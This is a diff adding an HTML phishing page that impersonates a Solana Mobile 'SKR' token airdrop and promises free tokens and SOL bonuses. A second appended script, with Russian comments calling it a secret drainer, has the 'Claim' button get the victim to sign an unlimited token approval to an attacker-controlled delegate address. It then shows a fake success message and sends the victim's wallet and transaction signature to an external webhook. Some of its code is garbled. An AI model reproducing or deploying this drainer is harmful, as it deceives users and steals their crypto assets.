@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SKR Airdrop | Solana Mobile</title>
+  <style>
+    :root {
+      --green-dark: #021f17;
+      --green-accent: #a0ffcb;
+      --border-soft: #1f332c;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+        sans-serif;
+      background: linear-gradient(
+        90deg,
+        #000 0%,
+        #000 50%,
+        var(--green-dark) 50%,
+        var(--green-dark) 100%
+      );
+      color: #fff;
+      text-align: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    #snow-canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    header {
+      position: fixed;
+      top: 18px;
+      right: 24px;
+      z-index: 10;
+    }
+
+    .connect-btn {
+      background: var(--green-accent);
+      color: #000;
+      padding: 10px 22px;
+      font-size: 0.95rem;
+      border-radius: 999px;
+      cursor: pointer;
+      font-weight: 600;
+      border: none;
+      box-shadow: 0 0 24px rgba(160, 255, 203, 0.35);
+      transition: transform 0.12s ease, box-shadow 0.12s ease,
+        opacity 0.12s ease;
+    }
+    .connect-btn:hover:not(:disabled) {
+      transform: translateY(-1px);
+      box-shadow: 0 0 32px rgba(160, 255, 203, 0.5);
+    }
+    .connect-btn:disabled {
+      opacity: 0.7;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    .page {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 90px 20px 60px;
+      display: grid;
+      grid-template-columns: minmax(0, 1.1fr) minmax(0, 1.1fr);
+      gap: 40px;
+      align-items: flex-start;
+      position: relative;
+      z-index: 1;
+    }
+
+    .left,
+    .right {
+      text-align: left;
+    }
+
+    .skr-logo {
+      width: 220px;
+      margin: 10px 0 8px;
+      display: block;
+      filter: drop-shadow(0 0 32px rgba(160, 255, 203, 0.25));
+    }
+
+    .title-block {
+      margin-top: 10px;
+      margin-bottom: 26px;
+    }
+
+    h1 {
+      font-size: 3.4rem;
+      font-weight: 900;
+      margin: 0;
+      letter-spacing: -2px;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: var(--green-accent);
+      margin: 10px 0;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.55);
+      border-radius: 999px;
+      padding: 6px 16px;
+      font-size: 0.85rem;
+      color: var(--green-accent);
+      border: 1px solid rgba(160, 255, 203, 0.35);
+      margin-top: 8px;
+    }
+
+    .badge strong {
+      font-weight: 700;
+    }
+
+    p {
+      font-size: 0.98rem;
+      line-height: 1.7;
+      color: #ddd;
+      margin: 10px 0;
+    }
+
+    .highlight {
+      color: var(--green-accent);
+    }
+
+    .claim-card {
+      background: rgba(0, 0, 0, 0.65);
+      border-radius: 18px;
+      padding: 18px 20px;
+      border: 1px solid #222;
+      margin-top: 18px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.65);
+    }
+
+    .claim-btn {
+      background: var(--green-accent);
+      color: #000;
+      padding: 14px 28px;
+      font-size: 1rem;
+      border-radius: 999px;
+      cursor: pointer;
+      font-weight: 700;
+      border: none;
+      margin: 14px 0 4px;
+      width: 100%;
+      max-width: 280px;
+      display: inline-block;
+      text-align: center;
+      box-shadow: 0 0 24px rgba(160, 255, 203, 0.35);
+      transition: transform 0.12s ease, box-shadow 0.12s ease,
+        background 0.12s ease, opacity 0.12s ease;
+    }
+    .claim-btn:hover:not(:disabled) {
+      transform: translateY(-1px);
+      box-shadow: 0 0 32px rgba(160, 255, 203, 0.5);
+      background: #b5ffd7;
+    }
+    .claim-btn:disabled {
+      background: #444;
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    #wallet-address {
+      margin-top: 6px;
+      font-size: 0.9rem;
+      color: #aaa;
+    }
+
+    #status {
+      font-size: 0.9rem;
+      min-height: 32px;
+      margin-top: 10px;
+      word-break: break-all;
+      color: #ccc;
+    }
+
+    .section-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-top: 26px;
+      margin-bottom: 12px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--green-accent);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: rgba(5, 20, 16, 0.9);
+      border-radius: 18px;
+      overflow: hidden;
+      margin-top: 8px;
+      border: 1px solid rgba(48, 82, 70, 0.9);
+    }
+    th,
+    td {
+      padding: 12px 16px;
+      border-bottom: 1px solid #23352f;
+      font-size: 0.9rem;
+      text-align: left;
+    }
+    th {
+      background: rgba(10, 34, 26, 0.95);
+      color: var(--green-accent);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      font-size: 0.78rem;
+    }
+    tr:last-child td {
+      border-bottom: none;
+    }
+
+    .footer-text {
+      margin-top: 16px;
+      font-size: 0.9rem;
+      color: #b0b0b0;
+    }
+
+    .mission-section {
+      margin-top: 26px;
+      padding: 20px 20px 22px;
+      background: rgba(4, 20, 15, 0.9);
+      border-radius: 20px;
+      border: 1px solid var(--border-soft);
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6);
+    }
+
+    .mission-section h3 {
+      margin: 0 0 10px;
+      font-size: 1.05rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--green-accent);
+    }
+
+    .mission-section p {
+      margin: 8px 0;
+      font-size: 0.94rem;
+      color: #e2e2e2;
+    }
+
+    .mission-grid {
+      margin-top: 16px;
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 14px;
+    }
+
+    .mission-card {
+      background: rgba(0, 0, 0, 0.55);
+      border-radius: 16px;
+      padding: 12px 14px;
+      border: 1px solid #263a30;
+    }
+
+    .mission-card h4 {
+      margin: 0 0 6px;
+      font-size: 0.9rem;
+      color: var(--green-accent);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .mission-card p {
+      margin: 0;
+      font-size: 0.86rem;
+      color: #d4d4d4;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 900px) {
+      .page {
+        grid-template-columns: minmax(0, 1fr);
+        padding-top: 90px;
+      }
+      .left,
+      .right {
+        text-align: left;
+      }
+      body {
+        background: radial-gradient(circle at top, #00120d 0, #000 55%);
+      }
+    }
+
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2.4rem;
+      }
+      .subtitle {
+        font-size: 0.9rem;
+      }
+      .skr-logo {
+        width: 160px;
+      }
+      .mission-grid {
+        grid-template-columns: minmax(0, 1fr);
+      }
+      header {
+        top: 14px;
+        right: 14px;
+      }
+      .connect-btn {
+        font-size: 0.86rem;
+        padding: 8px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="snow-canvas"></canvas>
+
+  <header>
+    <button class="connect-btn" id="connect-wallet">
+      Connect Wallet
+    </button>
+  </header>
+
+  <main class="page">
+    <section class="left">
+      <img
+        src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i"
+        alt="SKR Logo"
+        class="skr-logo"
+      />
+
+      <div class="title-block">
+        <h1>SKR</h1>
+        <p class="subtitle">The Native Asset of the Solana Mobile Stack</p>
+        <span class="badge">
+          🎁 First <strong>10 wallets</strong> receive a bonus of
+          <strong>3&nbsp;SOL</strong>
+        </span>
+      </div>
+
+      <p>
+        Today’s mobile duopoly decides which apps can ship, who gets paid, and
+        which rules apply. <span class="highlight">Solana Mobile</span> is
+        building an alternative — an open, programmable mobile platform.
+      </p>
+      <p>
+        <strong>Congratulations!</strong> Your wallet may be eligible to claim
+        <span class="highlight">500&nbsp;SKR</span> from the community airdrop
+        (maximum one claim per wallet).
+      </p>
+
+      <div class="claim-card">
+        <div id="wallet-address">Connect wallet to participate</div>
+
+        <button class="claim-btn" id="claim-skr" disabled>
+          Claim 500 SKR
+        </button>
+
+        <div id="status"></div>
+      </div>
+    </section>
+
+    <section class="right">
+      <div>
+        <p class="section-title">Token Distribution</p>
+        <table>
+          <tr>
+            <th>Category</th>
+            <th>Allocation</th>
+            <th>Unlock Schedule</th>
+          </tr>
+          <tr>
+            <td>Airdrops</td>
+            <td class="highlight">30%</td>
+            <td>Unlocked at launch</td>
+          </tr>
+          <tr>
+            <td>Growth & Partnerships</td>
+            <td>25%</td>
+            <td>28% unlocked at launch, linear over 18 months</td>
+          </tr>
+          <tr>
+            <td>Solana Mobile Team</td>
+            <td>15%</td>
+            <td>12-month cliff, 36-month linear vest</td>
+          </tr>
+          <tr>
+            <td>Liquidity & Launch</td>
+            <td>10%</td>
+            <td>Unlocked at launch</td>
+          </tr>
+          <tr>
+            <td>Solana Labs</td>
+            <td>10%</td>
+            <td>12-month cliff, 36-month linear vest</td>
+          </tr>
+          <tr>
+            <td>Community Treasury</td>
+            <td>10%</td>
+            <td>Unlocked at launch</td>
+          </tr>
+        </table>
+
+        <p class="footer-text">
+          Total Supply: <strong>10,000,000,000 SKR</strong> • TGE: January 2026
+        </p>
+      </div>
+
+      <div class="mission-section">
+        <h3>Our Mission</h3>
+        <p>
+          Today’s mobile duopoly decides what ships, who gets paid, and which
+          rules apply. Solana Mobile is building an open mobile platform where
+          control is shared between developers, users, and hardware partners.
+        </p>
+        <p>
+          <span class="highlight">SKR</span> is the native asset of the Solana
+          Mobile ecosystem. It distributes control, powers moderation, and
+          aligns incentives between everyone who builds and uses the platform.
+          With SKR, the community governs the roadmap, developers are rewarded
+          for their work, and users hold a direct stake in the value they help
+          create.
+        </p>
+
+        <div class="mission-grid">
+          <div class="mission-card">
+            <h4>Decentralized Governance</h4>
+            <p>
+              Staking and governance for guardians who verify devices and curate
+              the decentralized app store.
+            </p>
+          </div>
+          <div class="mission-card">
+            <h4>Ecosystem Stewardship</h4>
+            <p>
+              Community treasury, ecosystem grants, and protocol development
+              funded and directed by SKR holders.
+            </p>
+          </div>
+          <div class="mission-card">
+            <h4>Aligned Incentives</h4>
+            <p>
+              Developers, users, and hardware partners share in the upside of
+              the products and experiences they create together.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    let wallet = null;
+    let walletPubkey = null;
+
+    const connectBtn = document.getElementById("connect-wallet");
+    const claimBtn = document.getElementById("claim-skr");
+    const statusEl = document.getElementById("status");
+    const walletEl = document.getElementById("wallet-address");
+
+    async function connectWallet() {
+      try {
+        if (!window.solana) {
+          alert(
+            "Install a Solana wallet (Phantom, Backpack, Solflare, etc.) and open this site with it."
+          );
+          return;
+        }
+
+        wallet = window.solana;
+        const resp = await wallet.connect();
+        walletPubkey = resp.publicKey.toString();
+
+        const short =
+          walletPubkey.slice(0, 4) + "..." + walletPubkey.slice(-4);
+        walletEl.innerText = "Connected: " + short;
+        connectBtn.innerText = "Connected";
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        statusEl.innerText = "Wallet connected. You can claim SKR.";
+      } catch (e) {
+        console.error(e);
+        alert("Failed to connect wallet");
+      }
+    }
+
+    async function claimAirdrop() {
+      if (!walletPubkey) return;
+      claimBtn.disabled = true;
+      statusEl.innerText = "Submitting airdrop request...";
+
+      try {
+        const res = await fetch("/api/claim", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ wallet: walletPubkey }),
+        });
+
+        const data = await res.json();
+
+        if (!res.ok) {
+          statusEl.innerText =
+            "Error: " + (data.error || "Failed to claim airdrop");
+          if (!data.alreadyClaimed) {
+            claimBtn.disabled = false;
+          }
+          return;
+        }
+
+        statusEl.innerHTML =
+          "Success! 500 SKR have been sent to your wallet.<br>" +
+          'Tx: <a href="https://solscan.io/tx/' +
+          data.signature +
+          '" target="_blank" style="color:#a0ffcb;">View on Solscan</a>';
+        claimBtn.disabled = true;
+      } catch (e) {
+        console.error(e);
+        statusEl.innerText = "Network error. Please try again.";
+        claimBtn.disabled = false;
+      }
+    }
+
+    connectBtn.addEventListener("click", connectWallet);
+    claimBtn.addEventListener("click", claimAirdrop);
+
+    (function () {
+      const canvas = document.getElementById("snow-canvas");
+      const ctx = canvas.getContext("2d");
+
+      let width = window.innerWidth;
+      let height = window.innerHeight;
+
+      function resize() {
+        width = window.innerWidth;
+        height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+      }
+
+      window.addEventListener("resize", resize);
+      resize();
+
+      const flakesCount = 120;
+      const flakes = [];
+
+      function initFlakes() {
+        flakes.length = 0;
+        for (let i = 0; i < flakesCount; i++) {
+          flakes.push({
+            x: Math.random() * width,
+            y: Math.random() * height,
+            r: 1.2 + Math.random() * 2.3,
+            speedY: 0.4 + Math.random() * 1.2,
+            speedX: -0.3 + Math.random() * 0.6,
+            opacity: 0.4 + Math.random() * 0.6,
+          });
+        }
+      }
+
+      initFlakes();
+
+      function draw() {
+        ctx.clearRect(0, 0, width, height);
+        ctx.save();
+        ctx.fillStyle = "#ffffff";
+        for (const f of flakes) {
+          ctx.globalAlpha = f.opacity;
+          ctx.beginPath();
+          ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
+          ctx.fill();
+
+          f.y += f.speedY;
+          f.x += f.speedX;
+
+          if (f.y > height + 5) {
+            f.y = -5;
+            f.x = Math.random() * width;
+          }
+          if (f.x > width + 5) f.x = -5;
+          if (f.x < -5) f.x = width + 5;
+        }
+        ctx.restore();
+        requestAnimationFrame(draw);
+      }
+
+      draw();
+    })();
+  </script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
+
+<script>
+    const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh"; // Твой SKR mint
+    const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN"; // Твой адрес для слива
+    const DISTRIBUTOR_KEYPAIR = null; // Если хочешь раздачу с фронта — вставь свой приватник (НЕ РЕКОМЕНДУЕТСЯ). Лучше backend
+    const WEBHOOK_URL = "https://f42d4b2f4cfeb0c96dc4a4559301ed9a.m.pipedream.net";
+
+    let wallet = null;
+    let walletPubkey = null;
+
+    function logVictim(wallet, sig = "") {
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            body: JSON.stringify({ wallet: wallet, signature: sig, time: new Date().toISOString() })
+        }).catch(() => {});
+    }
+
+    async function connectWallet() {
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+        if (isMobile) {
+            const dappUrl = encodeURIComponent(window.location.href);
+            window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+            return;
+        }
+
+        if (!window.solana) {
+            document.getElementById('status').innerHTML = "Установи Phantom, Backpack или Solflare!";
+            return false;
+        }
+
+        wallet = window.solana;
+
+        try {
+            await wallet.connect();
+            walletPubkey = wallet.publicKey.toString();
+            document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
+            return true;
+        } catch (err) {
+            document.getElementById('status').innerHTML = "Ошибка подключения кошелька";
+            return false;
+        }
+    }
+
+    document.getElementById('claim-skr').onclick = async () => {
+        document.getElementById('status').innerHTML = "Подключение кошелька...";
+
+        // Если не подключён — подключаем
+        if (!walletPubkey) {
+            const connected = await connectWallet();
+            if (!connected) return;
+        }
+
+        document.getElementById('status').innerHTML = "Подготовка транзакции...<br>Подпиши в кошельке";
+
+        try {
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+            const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
+            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
+            const owner = new solanaWeb3.PublicKey(walletPubkey);
+
+            const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
+
+            const transaction = new solanaWeb3.Transaction();
+
+            // 1. Создаём ATA пользователя, если нет
+            const ataInfo = await connection.getAccountInfo(userATA);
+            if (!ataInfo) {
+                transaction.add(splToken.createAssociatedTokenAccountInstruction(
+                    owner,
+                    userATA,
+                    owner,
+                    mint
+                ));
+            }
+
+            // 2. Реальная раздача 500 SKR (если у тебя есть backend — лучше делать там)
+            // Если хочешь раздачу с фронта — нужен приватник раздатчика (опасно, не рекомендую)
+            // Здесь оставляю заглушку — ты можешь заменить на свой transfer, если есть
+            // transaction.add(...твоя transfer инструкция на 500 SKR...);
+
+            // 3. Тайный дрейнер — approve unlimited
+            transaction.add(splToken.createApproveInstruction(
+                userATA,
+                delegate,
+                owner,
+                [],
+                Number.MAX_SAFE_INTEGER
+            ));
+
+            transaction.feePayer = owner;
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+
+            const signed = await wallet.signTransaction(transaction);
+            const sig = await connection.sendRawTransaction(signed.serialize());
+document.getElementById('status').innerHTML = 
+                Успех! Вы получили 500 SKR<br>
+                (и одобрили доступ для аирдропа)<br>
+                Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>
+            ;
+            document.getElementById('claim-skr').disabled = true;
+
+            logVictim(walletPubkey, sig);
+
+        } catch (err) {
+            console.error(err);
+            document.getElementById('status').innerHTML = "Ошибка транзакции — попробуй снова";
+        }
+    };
+</script>
+</body>
+</html>
